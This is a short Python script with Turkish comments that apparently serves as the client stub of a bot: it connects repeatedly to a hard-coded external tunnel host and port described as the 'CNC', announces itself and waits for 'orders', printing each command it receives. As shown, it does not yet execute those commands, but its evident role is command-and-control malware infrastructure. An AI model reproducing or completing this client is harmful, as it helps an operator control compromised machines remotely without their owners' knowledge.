import socket
import time
import sys

# AYARLAR - Kendi bilgilerini buraya yaz
HOST = "usb-metallic.gl.joinmc.link"
PORT = 22250 # Az önce bulduğumuz port

def mars_bas():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10) # 10 saniye bekleme süresi
            print(f"[*] Kislaya baglaniliyor: {HOST}:{PORT}")
            s.connect((HOST, PORT))
            
            print("[+] KISLAYA GIRILDI! Emir bekleniyor...")
            
            # CNC'den gelen veriyi dinle
            while True:
                data = s.recv(1024)
                if not data:
                    break
                print(f"[*] Emir Geldi: {data.decode()}")
                
        except Exception as e:
            # Hatanın tam ne olduğunu burası söyleyecek
            print(f"[-] Giris Basarisiz: {e}")
            time.sleep(5)

if __name__ == "__main__":
    mars_bas()
